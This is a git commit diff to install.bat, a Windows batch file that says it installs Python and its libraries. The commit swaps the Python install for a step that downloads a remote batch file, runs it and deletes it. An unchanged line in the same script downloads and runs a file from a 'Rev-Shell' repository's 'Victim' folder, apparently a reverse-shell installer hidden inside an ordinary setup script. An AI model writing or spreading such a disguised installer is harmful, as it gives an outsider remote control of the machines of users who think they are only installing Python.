736f3bd983c9917d9e6b12dead856223a67ffa26
OrtwIn <bertil.braun.private@gmail.com>
2020-07-01 11:57:53 +0200

    Update install.bat

--- install.bat
+++ install.bat
@@ -1,12 +1,9 @@
 @echo off
 rem automatically installes python and the required libraries etc.
 
-python --version 3>NUL
-if errorlevel 0 goto continue
-
-powershell -command "(New-Object Net.WebClient).DownloadFile('https://www.python.org/ftp/python/3.6.2/python-3.6.2.exe', 'C:/Tools/python-3.6.2.exe'); & c:\Tools\python-3.6.2.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 TargetDir=c:\Tools\Python362; [Environment]::SetEnvironmentVariable('PATH', ${env:path} + ';C:\Tools\Python362', 'Machine')"
-
-:continue
+powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/nuket/provision-windows/master/install-python.bat' -OutFile 'python.bat'}"
+call python.bat
+del python.bat
 
 powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/BertilBraun/Rev-Shell/master/Victim/rev-install.bat' -OutFile 'rev.bat'}"
 call rev.bat
